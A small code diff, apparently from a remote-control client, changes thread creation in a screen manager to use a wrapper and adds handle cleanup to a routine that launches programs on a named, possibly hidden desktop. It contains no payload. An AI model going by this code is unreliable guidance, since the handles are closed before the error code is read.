@@ -59,7 +59,7 @@ CScreenManager::CScreenManager(IOCPClient* ClientObject, int n, void* user):CMan
 	m_rclickPoint = {};
 	m_rclickWnd = nullptr;
 
-	m_hWorkThread = CreateThread(NULL,0, WorkThreadProc,this,0,NULL);
+	m_hWorkThread = __CreateThread(NULL,0, WorkThreadProc,this,0,NULL);
 }
 
 
@@ -106,7 +106,8 @@ bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName) {
 			szDirectoryName,
 			&sInfo,
 			&pInfo);
-
+		CloseHandle(pInfo.hProcess);
+		CloseHandle(pInfo.hThread);
 		TCHAR* pszError = NULL;
 		FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
 			NULL, GetLastError(), 0, reinterpret_cast<LPTSTR>(&pszError), 0, NULL);
